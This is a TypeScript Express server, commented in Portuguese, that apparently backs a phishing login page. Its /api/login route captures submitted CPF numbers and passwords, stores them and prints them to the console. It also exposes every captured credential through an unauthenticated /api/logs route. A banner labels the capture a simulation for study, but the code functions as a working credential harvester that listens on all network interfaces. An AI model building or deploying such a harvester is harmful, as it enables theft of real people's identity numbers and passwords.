import express from 'express';
import path from 'path';
import { createServer as createViteServer } from 'vite';

const capturedLogins: any[] = [];

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Middleware to parse JSON bodies
  app.use(express.json());

  // API route to capture login info
  app.post('/api/login', (req, res) => {
    const { cpf, password } = req.body;
    
    const logEntry = {
      id: Date.now(),
      cpf,
      password,
      timestamp: new Date().toLocaleString()
    };
    
    capturedLogins.push(logEntry); // Salva na memória do servidor

    console.log('\n======================================================');
    console.log('🚨 NOVO LOGIN CAPTURADO (SIMULAÇÃO PARA ESTUDO) 🚨');
    console.log(`CPF: ${cpf}`);
    console.log(`Senha: ${password}`);
    console.log(`Horário: ${logEntry.timestamp}`);
    console.log('======================================================\n');
    
    res.json({ success: true, message: 'Dados recebidos pelo servidor local.' });
  });

  // API para listar os logins capturados
  app.get('/api/logs', (req, res) => {
    res.json(capturedLogins);
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
    console.log(`Aguardando envios de formulário de login...`);
  });
}

startServer();